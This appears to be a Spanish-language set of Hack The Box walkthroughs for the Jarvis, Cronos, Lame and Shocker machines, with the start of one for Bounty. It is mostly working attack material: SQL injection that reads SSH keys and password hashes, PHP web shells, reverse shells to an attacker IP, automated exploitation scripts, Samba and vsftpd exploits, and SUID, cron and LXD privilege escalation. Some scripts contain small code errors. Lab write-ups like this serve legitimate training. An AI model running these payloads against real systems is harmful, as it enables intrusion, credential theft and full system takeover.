Aqui vemos que tenemos capacidad de lectura sobre ficheros internos passando por la Injeccion SQL. Continuamos

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/proc/net/tcp"),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/proc/net/fib_trie"),4,5,6,7 -- -
```

Esto no nos reporta nada. Bueno, ya sabemos que existen 2 usuarios en la maquina:

- root 
- pepper

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/home/pepper/.ssh/id_rsa"),4,5,6,7 -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,load_file("/home/pepper/user.txt"),4,5,6,7 -- -
```

Como vemos que no se puede avanzar mucho con la LFI, vamos a tirar mas del analysis de la base de datos.

```bash
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata -- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 0,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 1,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 2,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,schema_name,4,5,6,7 from information_schema.schemata limit 3,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="hotel" limit 0,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,table_name,4,5,6,7 from information_schema.tables where table_schema="hotel" limit 1,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 0,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 1,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,column_name,4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room" limit 2,1-- -
http://10.10.10.143/room.php?cod=-1 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_schema="hotel" and table_name="room"-- -
```

#### Aprovechando de la mysql db {-}

Como existe una tabla my_sql probamos a ver si encontramos usuarios y contraseña para esta base de datos.

```bash
http://10.10.10.143/room.php?cod-1 union select 1,2,group_concat(User,0x3A,Password),4,5,6,7 from mysql.user -- -
```

Vemos que existe el usuario DBAdmin con un hash de contraseña, si tiramos de Rainbow Tables como [CrackStation](https://crackstation.net/) vemos la contraseña
en texto claro.

Teniendo esto en cuenta, podriamos aprovechar de connectarnos a la routa `/phpmyadmin/` para lanzar commandos.


#### Using SQL Injection para crear ficheros {-}

Mirando las columnas de la tabla **hotel**, nos damos cuenta que no hay informaciones relevante como usuarios o contraseña. Aqui pensamos que los
tiros no van para el mismo camino. Miramos si tenemos capacidad de escritura.

```bash
http://10.10.10.143/room.php?cod-1 union select 1,2,"Hola esto es una prueba",4,5,6,7 into outfile "/var/www/html/prueba.txt" -- -
```

Aqui intentamos crear un fichero prueba.txt que creamos en una de las routas mas communes, y si lanzamos el commando y que navegamos por 
`http://10.10.10.143/prueba.txt` vemos el contenido.

```bash
http://10.10.10.143/room.php?cod-1 union select 1,2,"<?php system('whoami'); ?>",4,5,6,7 into outfile "/var/www/html/prueba.php" -- -
```

Aqui vemos www-data como usuario. Vamos a intentar ganar accesso al systema.

> [ ! ] NOTAS: todo esto se podria hacer de la misma manera desde el panel `phpmyadmin`


<!--chapter:end:25-Jarvis/25-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### S4vishell desde un SQL Injection {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos la s4vishell.php desde el SQL Injection

    ```bash
    http://10.10.10.143/room.php?cod-1 union select 1,2,"<?php system($_REQUEST['cmd']); ?>",4,5,6,7 into outfile "/var/www/html/s4vishell.php" -- -
    ```

1. Vamos a la pagina `http://10.10.10.143/s4vishell.php`
1. Probamos commandos

    ```bash
    http://10.10.10.143/s4vishell.php?cmd=id
    http://10.10.10.143/s4vishell.php?cmd=hostname -I
    http://10.10.10.143/s4vishell.php?cmd=ps -faux
    http://10.10.10.143/s4vishell.php?cmd=which nc
    ```

1. lanzamos una reverse SHELL

    ```bash
    http://10.10.10.143/s4vishell.php?cmd=nc -e /bin/bash 10.10.14.7 443
    ```

Ya hemos ganado accesso al systema.

```bash
whoami 

>www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

### Autopwn in python {-}

```python
#!/usr/bin/python3

import requests
import pdb
import sys
import signal
import time 
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo..\n")
    sys.exit(1)

# Ctrl_C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
create_file = '''http://10.10.10.143/room.php?cod=-1 union select 1,2,"<?php system('nc -e /bin/bash 10.10.14.7 443'); ?>",4,5,6,7 into outfile "/var/www/html/reverse.php"-- -'''
exec_file = "http://10.10.10.143/reverse.php"
lport = 443

def makeRequest():
    r = request.get(create_file)
    r = request.get(exec_file)

if __name__ == '__main__':
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()

```

### User pivoting al usuario pepper {-}

Hemos podido comprobar que no podiamos leer el fichero `user.txt` siendo el usuario `www-data`. Tendremos que convertirnos en el usuario
**pepper** antes de intentar rootear la maquina.

```bash
id
sudo -l
```

Aqui vemos que podemos ejecutar el script `/var/www/Admin-Utilities/simpler.py` como el usuario **pepper** sin proporcinar contraseña.

Si lanzamos el script con el commando `sudo -u pepper /var/www/Admin-Utilities/simpler.py` vemos que es una utilidad que lanza un ping a maquinas
definidas por el commando `-p`.

si nos ponemos en escucha por trazas **ICMP** con el commando `tcpdump -i tun0 icmp -n` y que lanzamos el script:

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> 10.10.14.7
```

Recibimos la traza **ICMP**.

Intentamos ver si podemos injectar commandos con el script.

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> 10.10.14.$(echo 7)
```

Aqui tambien recibimos la traza **ICMP** lo que significa que el programa interpreta codigo.

Si nos ponemos en escucha por el puerto 443 con `nc -nlvp 443` y que le ponemos

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> $(nc -e /bin/bash 10.10.14.7 443)
```

No funcciona. Si miramos el codigo fuente de script en python, vemos que hay caracteres que son considerados como invalidos.
Uno de ellos es el `-`

Decidimos crearnos un fichero `reverse.sh`

```bash
cd /tmp
nano reverse.sh`


#!/bin/bash

nc -e /bin/bash 10.10.14.7 443
```

Le damos derechos de ejecucion y lanzamos el script una vez mas.

```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p

> $(bash /tmp/reverse.sh)
```

Ya hemos podido entablar la conneccion como el usuario pepper y podemos ver la flag.

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

<!--chapter:end:25-Jarvis/25-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /home/pepper
ls
cd /Web
cd /Logs
cat 10.10.14.7.txt
```

Aqui vemos que nos a loggeado toda la Injeccion SQL.

```bash
id
sudo -l
find \-perm -4000 2>/dev/null
```

Vemos que systemctl es SUID y que tiene proprietario root

```bash
cd 
mkdir privesc
cd privesc
cp /tmp/reverse.sh privesc.sh
```

Aqui nos vamos a crear un systemctl service file -> `nano privesc.service`

```bash
[Unit]
Description=EEEEEEEe

[Service]
ExecStart=/home/pepper/privesc/privesc.sh

[Install]
WantedBy=multi-user.target
```

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Creamos un link del servicio

    ```bash
    systemctl link /home/pepper/privesc/privesc.service
    ```

1. Lanzamos el servicio

    ```bash
    systemctl enable --now /home/pepper/privesc/privesc.service
    ```


`whoami` -> root ;)

<!--chapter:end:25-Jarvis/25-04-PrivilegeEscalation.Rmd-->

# Cronos {-}

## Introduccion {-}

La maquina del dia 19/08/2021 se llama Cronos.

El replay del live se puede ver aqui

[![S4vitaar Cronos maquina](https://img.youtube.com/vi/E_w8hWAWwTI/0.jpg)](https://www.youtube.com/watch?v=E_w8hWAWwTI)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:26-Cronos/26-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.13
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.13
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.13 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p22,53,80 10.10.10.13 -oN targeted
```


| Puerto | Servicio | Que se nos occure?                     | Que falta?            |
| ------ | -------- | -------------------------------------- | --------------------- |
| 22     | ssh      | Conneccion directa                     | usuario y contraseña  |
| 53     | Domain   | AXFR - Ataque de transferencia de zona | Conocer algun dominio |
| 80     | http     | Web, Fuzzing                           |                       |



### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.13
```

Nada interesante aqui

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.143 -oN webScan
```

Vemos que hay un `/phpmyadmin`

#### Analyzando la web con Firefox {-}

Es la pagina Apache2 por defecto

### Analyzando los dominios {-}

Como el puerto 53 esta abierto vamos a ver si podemos recuperar dominios con **nslookup**

```bash
nslookup

>server 10.10.10.13
>10.10.10.13
13.10.10.10.in-addr.arpa    name = ns1.cronos.htb
```

Vemos un dominio `cronos.htb` y lo añadimos a nuestro `/etc/hosts`

Si lanzamos Firefox con la url `http://cronos.htb` vemos una pagina differente de la pagina apache2 por defecto, lo que
significa que estamos en frente de un **virtualhost**

Vamos a intentar hacer ataques de transferencia de zona

<!--chapter:end:26-Cronos/26-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### AXFR {-}

```bash
dig @10.10.10.13 cronos.htb ns
dig @10.10.10.13 cronos.htb mx
dig @10.10.10.13 cronos.htb axfr
```

Aqui vemos que es vulnerable a ataques **AXFR** y vemos otro dominio `admin.cronos.htb` que añadimos al `/etc/hosts`.

Si visitamos esta nueva web con Firefox vemos un panel de inicio de session.

### SQL Injection {-}

En el UserName si le ponemos la injeccion SQL basica `' or 1=1-- -` y le damos a submit, entramos directamente en el panel
de administracion.

Como sabemos que esta vulnerable a injeccion SQL, probamos differentes cosas porque lo que nos interesa es tener usuarios y contrañas.

```bash
' order by 100-- -
' or sleep(5)-- -
```

Vemos que no esta vulnerable a un **Error Based SQL Injection** pero lo es a un **Time Based SQL Injection**.

```bash
admin' or sleep(5)-- -
admin' and sleep(5)-- -
```

Con estos commandos, comprobamos que el usuario admin existe.

Creamos un script en python para encontrar las informaciones con un **Time Based SQL Injection**

#### Time Based SQL Injection Autopwn {-}

Buscamos en nombre de la database

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Database")

    database = ""

    
    for position in range(1, 10):
        for character in s:
            p1.status("Probando con el caracter %c en la posicion %d" % (character, position))
            post_data = {
                'username': "admin' and if(substr(database(),%d,1)='%c',sleep(5),1)-- -" % (position, character),
                'password': 'admin'
            }

            time_start = time.time()
            r = requests.post(login_url, data=post_data)
            time_end = time.time()

            if time_end - time_start > 5:
                password += character
                p2.status(database)
                break

if __name__ == '__main__':

    makeRequest()
```

Aqui vemos que la base de datos se llama `admin`. Buscamos ahora el nombre de la tabla.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Table")

    table_name = ""

    for table in range(0,4):
        for position in range(1, 10):
            for character in s:
                p1.status("Probando con el caracter %c en la posicion %d de la tabla numero " % (character, position, table))
                post_data = {
                    'username': "admin' and if(substr((select table_name from information_schema.tables where table_schema='admin' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (table, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    table_name += character
                    p2.status(table_name)
                    break
            break
        table_name += " - "

if __name__ == '__main__':

    makeRequest()
```

Ahora que sabemos que hay una tabla `users`, miramos las columnas.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Columns")

    column_name = ""

    for column in range(0,4):
        for position in range(1, 10):
            for character in s:
                p1.status("Probando con el caracter %c en la posicion %d de la columna numero %d de la tabla users " % (character, position, column))
                post_data = {
                    'username': "admin' and if(substr((select column_name from information_schema.columns where table_schema='admin' and table_name='users' limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (column, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    column_name += character
                    p2.status(column_name)
                    break
            break
        table_name += " - "

if __name__ == '__main__':

    makeRequest()
```

Ahora conocemos las columnas, vamos a por las data.

```python
#!/usr/bin/python3
#coding: utf-8

import requests
import signal
import pdb
import sys
import time

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

login_url = "http://admin.cronos.htb/index.php"
s = r'0123456789abcdef'

def makeRequest():

    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    p2 = log.progress("Password")

    password = ""

    for user in range(0, 4):
        for position in range(1, 50):
            for character in s:
                p1.status("Posicion numero %d de la extraccion de password del usuario admin | Caracter %c" % (position, character))
                post_data = {
                    'username': "admin' and if(substr((select password from users limit %d,1),%d,1)='%c',sleep(5),1)-- -" % (user, position, character),
                    'password': 'admin'
                }

                time_start = time.time()
                r = requests.post(login_url, data=post_data)
                time_end = time.time()

                if time_end - time_start > 5:
                    password += character
                    p2.status(password)

if __name__ == '__main__':

    makeRequest()
```

Aqui vemos que es un hash MD5 y passamos por rainbow tables para crackear la contraseña.

#### Utilizando la web {-}

La pagina web permite enviar ping a maquinas. Lo intentamos contra nuestra maquina de atacante.

1. En la maquina de atacante

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. Lanzamos por la web un ping a la 10.10.14.7

Y recibimos la traza.

Miramos si la web esta bien sanitizada mirando si poniendole `10.10.14.7; whoami` no salimos del contexto y es el caso.
Vamos a ganar accesso al systema.

<!--chapter:end:26-Cronos/26-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Autopwn {-}

```python
#!/usr/bin/python3

import requests
import pdb
import signal
import threading

from pwn import *

def def_handler(sig, frame):
    print("\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://admin.cronos.htb/index.php"
shell_url = "http://admin.cronos.htb/welcome.php"
lport = 443

def makeRequest():

    s = requests.session()

    post_data = {
        'username': 'admin',
        'password': '1327663704'
    }

    r = s.post(login_url, data=post_data)

    post_data = {
        'command': 'ping -c 1',
        'host': '10.10.14.7; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 443 >/tmp/f'
    }

    r = s.post(shell_url, data=post_data)

if __name__ == '__main__':
    
    try:
        threading.Thread(target=makeRequest, args=()).start()
    except Exception as e:
        log.error(str(e))

    shell = listen(lport, timeout=20).wait_for_connection()
    shell.interactive()
```

Si lanzamos en script ganamos accesso al systema.

```bash
whoami

www-data
```

### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Tenemos que ver si tenemos que hacer un user pivoting pero como ya tenemos accesso a la flag, no es necessario.

<!--chapter:end:26-Cronos/26-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
uname -a
lsb_release -a
find \-perm -4000 2>/dev/null
```

Aqui no hay nada interesante, vamos a enumerar el systema por tareas cron

```bash
cd /dev/shm
ls
touch procmon.sh
chmod +x procmon.sh
nano procmon.sh
```

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v -E "procmon|command"
    old_process=$new_process
done
```

Y lo ejecutamos. Vemos que hay una tarea que ejecuta un script llamado artisan en **php**. Haciendole un `ls -l` nos damos cuenta que
el proprietario del script es **www-data**. Imaginamos que el que lanza el script es root. vamos a modificar el script.

```php
<?php
    system("chmod 4755 /bin/bash");
?>
```

Esperamos que la tarea se ejecute con `watch -n 1 ls -l /bin/bash` y pasa a ser SUID

```bash
bash -p
whoami

root
```


<!--chapter:end:26-Cronos/26-04-PrivilegeEscalation.Rmd-->

# Lame {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se llama Lame.

El replay del live se puede ver aqui

[![S4vitaar Lame maquina](https://img.youtube.com/vi/MNJi4k9uNKQ/0.jpg)](https://www.youtube.com/watch?v=MNJi4k9uNKQ)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:27-Lame/27-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.3
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.3
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.3 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p21,22,139,445,3632 10.10.10.3 -oN targeted
```


| Puerto | Servicio | Que se nos occure?          | Que falta?           |
| ------ | -------- | --------------------------- | -------------------- |
| 21     | ftp      | Conexion como Anonymous     |                      |
| 22     | ssh      | Conneccion directa          | usuario y contraseña |
| 139    | smbd     | Conneccion con Null session |                      |
| 445    | smbd     | Conneccion con Null session |                      |
| 3632   | distccd  | Web, Fuzzing                |                      |



### Conexion Anonymous con ftp {-}

```bash
ftp 10.10.10.3

Name: anonymous
Password: 

Login successful

ls
```

Podemos connectar como anonymous pero no nos reporta nada. El resultado de nmap nos da que el vsftpd es de version 2.3.4.



<!--chapter:end:27-Lame/27-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### vsftpd 2.3.4 {-}

Miramos si existe un exploit para este servicio.

```bash
searchsploit vsftpd 2.3.4
```

Vemos que hay una vulnerabilidad y que existe un exploit. Como el exploit es une exploit Metasploit, vamos buscando por
la web si existe otro exploit y la encontramos en [cherrera0001 github](https://github.com/cherrera0001/vsftpd_2.3.4_Exploit).

```python
#!/usr/bin/python3
from pwn import log,remote
from sys import argv,exit
from time import sleep

if len(argv) < 2:
    exit(f'Usage: {argv[0]} Target_IP')


p = log.progress("Running")
vsftpd = remote(argv[1], 21)

p.status('Checking Version')
recv = vsftpd.recvuntil(")",timeout=5)
version = (recv.decode()).split(" ")[2].replace(")","")
if version != '2.3.4':
	exit('2.3.4 Version Not Found')

vsftpd.sendline('USER hii:)')
vsftpd.sendline('PASS hello')
p.status('Backdoor Activated')

sleep(3)

backdoor = remote(argv[1], 6200)
p.success("Got Shell!!!")
backdoor.interactive()
```

Si lanzamos el script no funcciona, parece ser que la version a sido parcheada -> rabbithole. 

### SAMBA 3.0.20 {-}

```bash
searchsploit samba 3.0.20
```

Vemos que hay un exploit para Metasploit que permite ejecutar commandos. Examinamos el script con el commando `searchsploit -x 16320` y vemos
que podemos injectar commandos desde el nombre de usuario con el formato siguiente

```ruby
username = "/=`nohup " + payload.encoded + "`"
```

Vamos a por pruebas

1. Nos ponemos en escucha de trazas ICMP

    ```bash
    tcpdump -i tun0 icmp -n
    ```

1. Intentamos enviar commandos siguiendo la guia del script

    ```bash
    smbclient -L 10.10.10.3 -N --option="client min protocol=NT1"
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c "dir"
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1"
    smb: \> logon "/='nohup ping -c 1 10.10.14.7'"
    ```

Vemos que esto functionna perfectamente. Vamos a ganar accesso al systema.

<!--chapter:end:27-Lame/27-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la vulnerabilidad SAMBA 3.0.20 {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Intentamos enviar commandos siguiendo la guia del script

    ```bash
    smbclient //10.10.10.3/tmp -N --option="client min protocol=NT1" -c 'logon "/=`nohup nc -e /bin/bash 10.10.14.7 443`"'
    ```

Hemos ganado accesso al systema.


### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `whoami` vemos que ya estamos root ;) No se necessita escalar privilegios en este caso.

<!--chapter:end:27-Lame/27-03-GainingAccess.Rmd-->

# Shocker {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se shocker.

El replay del live se puede ver aqui

[![S4vitaar Shocker maquina](https://img.youtube.com/vi/7BGLph5TWMY/0.jpg)](hhttps://www.youtube.com/watch?v=7BGLph5TWMY)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:28-Shocker/28-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.56
```
ttl: 63 -> maquina Linux

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.56
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.56 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80,2222 10.10.10.56 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta?           |
| ------ | -------- | ------------------ | -------------------- |
| 80     | http     | Web, Fuzzing       |                      |
| 2222   | ssh      | Conneccion directa | usuario y contraseña |




### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.56
```

Nada interesante aqui

#### http-enum {-}

Lanzamos un web scan con nmap.

```bash
nmap --script http-enum -p80 10.10.10.56 -oN webScan
```

Nada interesante.

#### Analyzando la web con Firefox {-}

Hay una pagina que nos dice *Don't Bug Me!* y nada mas. Como la maquina se llama Shocker, pensamos directamente al ataque ShellShock

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.56/FUZZ/
```

Encontramos una routa muy interesante que es el `cgi-bin` que es la routa donde si la bash es vulnerable podemos hacer un ataque shellshock.


<!--chapter:end:28-Shocker/28-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### ShellShock attack {-}

1. creamos un diccionario de extensiones

    ```bash
    nano extension.txt

    sh
    pl
    py
    cgi
    ```

1. lanzamos nuevamente wfuzz con la extension

    ```bash
    wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extension.txt http://10.10.10.56/cgi-bin/FUZZ.FUZ2Z
    ```

Como aqui hemos encontrado un fichero `user.sh` lanzamos un curl para ver lo que es.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh"
```

Ya podemos lanzar el ataque shellshock cambiando la cabezera User-Agent.

```bash
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; }; /usr/bin/whoami"
curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /usr/bin/whoami"
```

Vemos la respuesta shelly quiere decir que estamos en capacidad de ejecutar commandos a nivel de systema, gracias a esta vulnerabilidad.

<!--chapter:end:28-Shocker/28-02-VulnerabilityAssesment.Rmd-->

## Vuln exploit & Gaining Access {-}

### Ganando accesso desde la vulnerabilidad ShellShock {-}

1. Nos ponemos en escucha por el puerto 443

    ```bash
    nc -nlvp 443
    ```

1. Entablamos una reverse shell

    ```bash
    curl -s -X GET "http://10.10.10.56/cgi-bin/user.sh" -H "User-Agent: () { :; };echo;echo; /bin/bash -i >& /dev/tcp/10.10.14.7/443 0>&1
    ```

Hemos ganado accesso al systema.


### Tratamiento de la TTY {-}

```bash
script /dev/null -c bash
^Z
stty raw -echo; fg
-> reset
-> xterm
export TERM=xterm
export SHELL=bash

stty -a

stty rows <rownb> columns <colnb>
```

Dandole a `whoami` vemos que ya estamos shelly y que podemos leer la flag.

<!--chapter:end:28-Shocker/28-03-GainingAccess.Rmd-->

## Privilege Escalation {-}

### Rootear la maquina {-}

```bash
cd /root
id
sudo -l
```

Vemos que estamos en el grupo lxd ;) y ademas podemos ejecutar /usr/bin/perl como root si proporcionar contraseña.

### Escalar privilegios con /usr/bin/perl {-}

```bash
sudo -u root perl -e 'exec "/bin/sh"'
whoami 
#Output
root
```

### Escalar privilegios con LXD {-}

```bash
searchsploit lxd
searchsploit -x 46978
```

Si Si el exploit a sido creado por el mismo S4vitar. Para usar el exploit, lo primero es mirar si estamos en una maquina 32 o 64 bits.

```bash
uname -a
```

Seguimos los passos del exploit

1. En la maquina de attaquante

    ```bash
    wget https://raw.githubusercontent.com/saghul/lxd-alpine-builder/master/build-alpine
    chmod +x build-alpine
    ./build-alpine # --> para maquinas x64
    ./build-alpine -a i686 # --> para maquinas i686
    searchsploit -m 46978
    mv 46978.sh lxd_privesc.sh
    dos2unix lxd_privesc.sh
    python3 -m http.server 80
    ```

1. En la maquina victima

    ```bash
    wget http://10.10.14.20/alpine-v3-14-i686-20210728_2134.tar.gz
    wget http://10.10.14.20/lxd_privesc.sh
    chmod +x lxd_privesc.sh
    ./lxd_privesc.sh -f alpine-v3-14-i686-20210728_2134.tar.gz
    ```

1. vemos un error `error: This must be run as root`. Modificamos el fichero lxd_privesc.sh

    ```bash
    nano lxd_privesc.sh
    ```

    en la function createContainer(), borramos la primera linea:
    
    ```bash
    # lxc image import $filename --alias alpine && lxd init --auto
    ```

1. Ya estamos root pero en el contenedor. Modificamos la `/bin/bash` de la maquina

    - en el contenedor

        ```bash
        cd /mnt/root
        ls
        cd /bin
        chmod 4755 bash
        exit
        ```

    - en la maquina victima

        ```bash
        bash -p
        whoami
        #Output
        root
        ```


<!--chapter:end:28-Shocker/28-04-PrivilegeEscalation.Rmd-->

# Bounty {-}

## Introduccion {-}

La maquina del dia 20/08/2021 se llama Bounty.

El replay del live se puede ver aqui

[![S4vitaar Bounty maquina](https://img.youtube.com/vi/eY0ENzTwv_M/0.jpg)](https://www.youtube.com/watch?v=eY0ENzTwv_M)

No olvideis dejar un like al video y un commentario...

<!--chapter:end:29-Bounty/29-00-Information.Rmd-->

## Enumeracion {-}

### Reconocimiento de maquina, puertos abiertos y servicios {-} 

#### Ping {-}

```bash
ping -c 1 10.10.10.93
```
ttl: 127 -> maquina Windows

#### Nmap {-}

```bash
nmap -p- --open -T5 -v -n 10.10.10.93
```

Va lento

```bash
nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.10.93 -oG allPorts 
extractPorts allPorts
nmap -sC -sV -p80 10.10.10.93 -oN targeted
```


| Puerto | Servicio | Que se nos occure? | Que falta? |
| ------ | -------- | ------------------ | ---------- |
| 80     | http     | Web, Fuzzing       |            |


### Analyzando la web {-}

#### Whatweb {-}

```bash
whatweb http://10.10.10.93
```

Estamos en frente de un IIS

#### Analyzando la web con Firefox {-}

Vemos una imagen de Merlin ;)

#### Fuzzing con WFuzz {-}

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.93/FUZZ
```

Encontramos una routa `uploadedFiles`, probamos con una extension `.aspx` porque es un IIS

```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.93/FUZZ.aspx
```

Encontramos una routa `transfer.aspx`

Si la analyzamos con firefox, vemos una pagina que nos permite subir ficheros.

<!--chapter:end:29-Bounty/29-01-Enumeration.Rmd-->

## Vulnerability Assessment {-}

### Vulnerabilidad IIS en file upload {-}

